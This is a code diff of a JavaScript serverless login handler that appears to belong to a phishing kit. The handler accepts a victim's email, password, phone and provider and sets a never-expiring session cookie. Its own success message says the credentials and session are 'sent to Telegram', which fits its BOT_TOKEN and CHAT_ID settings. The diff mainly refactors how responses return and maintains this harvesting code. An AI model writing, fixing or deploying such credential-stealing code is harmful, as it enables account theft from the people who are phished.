@@ -12,28 +12,33 @@ function getSessionKey(token) {
 export default async function handler(req, res) {
   // Check environment variables
   if (!BOT_TOKEN || !CHAT_ID || !process.env.REDIS_URL) {
-    return res.status(500).json({
+    res.status(500).json({
       success: false,
       message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL",
     });
+    return;
   }
 
   if (req.method !== "POST") {
-    return res.status(405).json({ success: false, message: "Method not allowed" });
+    res.status(405).json({ success: false, message: "Method not allowed" });
+    return;
   }
 
   let bodyObj = req.body;
+  // Some ESM frameworks will always parse req.body as object, but some (like Vercel's edge functions) may give string
   if (typeof bodyObj === "string") {
     try {
       bodyObj = JSON.parse(bodyObj);
     } catch {
-      return res.status(400).json({ success: false, message: "Invalid JSON body" });
+      res.status(400).json({ success: false, message: "Invalid JSON body" });
+      return;
     }
   }
 
   const { email, password, phone, provider } = bodyObj || {};
   if (!email || !password || !provider) {
-    return res.status(400).json({ success: false, message: "Missing required fields" });
+    res.status(400).json({ success: false, message: "Missing required fields" });
+    return;
   }
 
   const normalizedEmail = email.trim().toLowerCase();
@@ -44,7 +49,8 @@ export default async function handler(req, res) {
     await redis.set(getSessionKey(sessionToken), normalizedEmail);
   } catch (err) {
     console.error("Redis error:", err);
-    return res.status(500).json({ success: false, message: "Failed to store session" });
+    res.status(500).json({ success: false, message: "Failed to store session" });
+    return;
   }
 
   // Far-future date for "never" expiring cookies
@@ -88,7 +94,7 @@ export default async function handler(req, res) {
   // Set the session cookie (never expires)
   res.setHeader("Set-Cookie", cookieString);
 
-  return res.status(200).json({
+  res.status(200).json({
     success: true,
     message: "Login successful. Credentials and session sent to Telegram.",
     session: sessionToken,
